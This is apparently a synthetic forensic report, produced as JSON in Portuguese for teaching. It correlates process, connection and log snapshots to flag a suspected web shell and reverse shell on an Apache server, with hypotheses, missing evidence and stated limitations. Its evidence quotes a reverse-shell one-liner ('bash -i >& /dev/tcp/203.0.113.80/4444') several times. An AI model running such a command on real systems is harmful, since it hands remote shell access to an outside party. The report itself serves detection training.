@@ -1,0 +1,311 @@
+{
+  "origin": "dataset:datasets\\webshell",
+  "collected_at": "2026-09-14T09:00:18-03:00",
+  "metadata": {
+    "dataset_type": "synthetic_training",
+    "level": "basic",
+    "scenario": "webshell",
+    "seed": 42,
+    "generated_at": "2026-09-22T13:59:06.615770-03:00",
+    "warning": "Dados fictícios para uso acadêmico; não representam um incidente real."
+  },
+  "inventory": {
+    "processes": 10,
+    "services": 3,
+    "files": 7,
+    "log_events": 6,
+    "connections": 3
+  },
+  "coverage": {
+    "processes.csv": "ok",
+    "permissions.csv": "ok",
+    "connections.csv": "ok",
+    "services.txt": "ok",
+    "journal.log": "ok"
+  },
+  "conclusion": [
+    "2 finding(s): 2 alto, 0 medio, 0 baixo, 0 informativo.",
+    "Relações de risco que merecem investigação prioritária: F-001 Shell com conexão externa: PID 5121 bash -> 203.0.113.80:4444; F-002 Conta de serviço 'www-data' (apache2.service) abriu sh.",
+    "Nenhum finding, isoladamente, prova exploração: cada um lista a evidência que falta."
+  ],
+  "findings": [
+    {
+      "rule": "CORR-05",
+      "title": "Shell com conexão externa: PID 5121 bash -> 203.0.113.80:4444",
+      "severity": "alto",
+      "confidence": "alta",
+      "evidence": [
+        {
+          "statement": "socket tcp 10.20.30.10:48122 -> 203.0.113.80:4444 ESTABLISHED",
+          "ref": "connections.csv:2"
+        },
+        {
+          "statement": "PID 5121 (PPID 5120) user=www-data cmd='/bin/bash -i'",
+          "ref": "processes.csv:11"
+        },
+        {
+          "statement": "cadeia: 5121:/bin/bash -i(www-data) <- 5120:/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/(www-data) <- 744:/usr/sbin/apache2 -k start(www-data) <- 733:/usr/sbin/apache2 -k start(www-data) <- 1:/sbin/init(root)",
+          "ref": "árvore de processos"
+        },
+        {
+          "statement": "descende do serviço apache2.service; o processo roda como 'www-data'",
+          "ref": "services.txt:3"
+        }
+      ],
+      "interpretation": [
+        "Um shell (bash) mantém conexão com 203.0.113.80 (IP público de documentação (TEST-NET), tratado como externo).",
+        "Shell com entrada/saída ligadas a um socket externo é o padrão de reverse shell."
+      ],
+      "hypotheses": [
+        "H1: reverse shell obtida pela exploração do serviço pai.",
+        "H2: administrador usando nc para transferência pontual."
+      ],
+      "missing_evidence": [
+        "para onde apontam os descritores 0/1/2 do processo",
+        "tráfego trocado",
+        "requisição que originou o processo"
+      ],
+      "not_proven": "Sem o conteúdo do tráfego não se pode afirmar que houve controle remoto.",
+      "entities": {
+        "pids": [
+          "5121"
+        ]
+      },
+      "id": "F-001"
+    },
+    {
+      "rule": "CORR-02",
+      "title": "Conta de serviço 'www-data' (apache2.service) abriu sh",
+      "severity": "alto",
+      "confidence": "media",
+      "evidence": [
+        {
+          "statement": "PID 5120 (PPID 744) user=www-data cmd='/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/4444 0>&1''",
+          "ref": "processes.csv:10"
+        },
+        {
+          "statement": "cadeia: 5120:/bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/(www-data) <- 744:/usr/sbin/apache2 -k start(www-data) <- 733:/usr/sbin/apache2 -k start(www-data) <- 1:/sbin/init(root)",
+          "ref": "árvore de processos"
+        },
+        {
+          "statement": "descende do serviço apache2.service (descendente de 733)",
+          "ref": "services.txt:3"
+        },
+        {
+          "statement": "PID 5121 (PPID 5120) user=www-data cmd='/bin/bash -i' (descendente)",
+          "ref": "processes.csv:11"
+        },
+        {
+          "statement": "socket tcp 10.20.30.10:48122 -> 203.0.113.80:4444 ESTABLISHED (PID 5121)",
+          "ref": "connections.csv:2"
+        },
+        {
+          "statement": "log: apache2[744] [php:warn] system() called from /var/www/html/uploads/img.php",
+          "ref": "journal.log:6"
+        }
+      ],
+      "interpretation": [
+        "apache2.service roda como 'www-data' e, na árvore, gerou um shell ou cliente de rede.",
+        "Servidores web e daemons raramente precisam abrir shells.",
+        "Há destino externo: 203.0.113.80 (IP público de documentação (TEST-NET), tratado como externo)."
+      ],
+      "hypotheses": [
+        "H1: funcionalidade legítima da aplicação (CGI, script de manutenção).",
+        "H2: execução remota de comandos pela aplicação (web shell), com possível reverse shell."
+      ],
+      "missing_evidence": [
+        "logs de acesso da aplicação no mesmo horário",
+        "arquivos criados recentemente na aplicação",
+        "conteúdo trafegado na conexão"
+      ],
+      "not_proven": "Não prova que a aplicação foi comprometida; mostra uma cadeia atípica para essa identidade.",
+      "entities": {
+        "services": [
+          "apache2.service"
+        ],
+        "pids": [
+          "5120",
+          "5121"
+        ]
+      },
+      "id": "F-002"
+    }
+  ],
+  "clean_checks": [
+    {
+      "rule": "CORR-01",
+      "subject": "ssh.service",
+      "reason": "executa como root, mas não há permissões coletadas para /usr/sbin/sshd: não dá para afirmar nem descartar risco."
+    },
+    {
+      "rule": "CORR-01",
+      "subject": "apache2.service",
+      "reason": "unit sem User= (root), mas o processo executa como www-data."
+    },
+    {
+      "rule": "CORR-01",
+      "subject": "cron.service",
+      "reason": "executa como root, mas não há permissões coletadas para /usr/sbin/cron: não dá para afirmar nem descartar risco."
+    },
+    {
+      "rule": "CORR-02",
+      "subject": "sessão aluno@pts/0 (PID 1204)",
+      "reason": "2 processo(s) como 'aluno' sem troca de privilégio; login de 10.20.30.44 confirmado no log"
+    },
+    {
+      "rule": "CORR-04",
+      "subject": "ssh.service",
+      "reason": "log de início coerente com o PID 612."
+    },
+    {
+      "rule": "CORR-04",
+      "subject": "apache2.service",
+      "reason": "log de início coerente com o PID 733."
+    },
+    {
+      "rule": "CORR-05",
+      "subject": "tcp/80 (apache2)",
+      "reason": "porta pertence ao serviço apache2.service."
+    },
+    {
+      "rule": "CORR-05",
+      "subject": "tcp/22 (sshd)",
+      "reason": "porta pertence ao serviço ssh.service."
+    },
+    {
+      "rule": "PERM-01",
+      "subject": "/home/aluno/check.py",
+      "reason": "pertence a 'aluno' e só é executado por ele: sem cruzamento de privilégio."
+    }
+  ],
+  "timeline": [
+    {
+      "timestamp": "2026-09-14T09:00:00-03:00",
+      "source": "journal.log:1",
+      "event": "systemd: Started ssh.service - OpenBSD Secure Shell server.",
+      "links": [
+        "ssh.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:00-03:00",
+      "source": "processes.csv:2",
+      "event": "processo observado no snapshot: PID 1 (root) /sbin/init",
+      "links": []
+    },
+    {
+      "timestamp": "2026-09-14T09:00:02-03:00",
+      "source": "journal.log:2",
+      "event": "systemd: Started apache2.service - The Apache HTTP Server.",
+      "links": [
+        "apache2.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:02-03:00",
+      "source": "processes.csv:3",
+      "event": "processo observado no snapshot: PID 612 (root) /usr/sbin/sshd -D",
+      "links": [
+        "ssh.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:04-03:00",
+      "source": "processes.csv:4",
+      "event": "processo observado no snapshot: PID 701 (root) /usr/sbin/cron -f",
+      "links": [
+        "cron.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:06-03:00",
+      "source": "processes.csv:5",
+      "event": "processo observado no snapshot: PID 733 (www-data) /usr/sbin/apache2 -k start",
+      "links": [
+        "apache2.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:08-03:00",
+      "source": "journal.log:3",
+      "event": "sshd: Accepted publickey for aluno from 10.20.30.44 port 51518 ssh2",
+      "links": [
+        "PID 1204 (aluno)",
+        "ssh.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:08-03:00",
+      "source": "processes.csv:6",
+      "event": "processo observado no snapshot: PID 744 (www-data) /usr/sbin/apache2 -k start",
+      "links": [
+        "apache2.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:10-03:00",
+      "source": "journal.log:4",
+      "event": "systemd-logind: New session 7 of user aluno.",
+      "links": []
+    },
+    {
+      "timestamp": "2026-09-14T09:00:10-03:00",
+      "source": "processes.csv:7",
+      "event": "processo observado no snapshot: PID 1204 (aluno) sshd: aluno@pts/0",
+      "links": []
+    },
+    {
+      "timestamp": "2026-09-14T09:00:12-03:00",
+      "source": "processes.csv:8",
+      "event": "processo observado no snapshot: PID 1212 (aluno) /bin/bash",
+      "links": []
+    },
+    {
+      "timestamp": "2026-09-14T09:00:14-03:00",
+      "source": "processes.csv:9",
+      "event": "processo observado no snapshot: PID 1234 (aluno) /usr/bin/python3 /home/aluno/check.py",
+      "links": []
+    },
+    {
+      "timestamp": "2026-09-14T09:00:15-03:00",
+      "source": "journal.log:5",
+      "event": "python3: routine check completed status=OK",
+      "links": [
+        "PID 1234 (aluno)"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:16-03:00",
+      "source": "processes.csv:10",
+      "event": "processo observado no snapshot: PID 5120 (www-data) /bin/sh -c 'bash -i >& /dev/tcp/203.0.113.80/4444 0>&1'",
+      "links": [
+        "apache2.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:00:18-03:00",
+      "source": "processes.csv:11",
+      "event": "processo observado no snapshot: PID 5121 (www-data) /bin/bash -i",
+      "links": [
+        "apache2.service"
+      ]
+    },
+    {
+      "timestamp": "2026-09-14T09:15:00-03:00",
+      "source": "journal.log:6",
+      "event": "apache2: [php:warn] system() called from /var/www/html/uploads/img.php",
+      "links": [
+        "PID 744 (www-data)",
+        "apache2.service"
+      ]
+    }
+  ],
+  "limitations": [
+    "snapshot de processos não é atômico: timestamps de 2026-09-14 09:00:00-03:00 a 2026-09-14 09:00:18-03:00.",
+    "journal.log não tem ano nem fuso: assumidos 2026 e UTC-03:00 (derivados de processes.csv).",
+    "Dataset sintético: mtimes são artificiais; nenhuma conclusão depende só deles.",
+    "Snapshot pontual: processos de vida curta entre coletas não são vistos.",
+    "Membros de grupos não são coletados: escrita por grupo gera severidade média.",
+    "Destinos de rede são classificados de forma descritiva (privado/público), não por reputação."
+  ]
+}
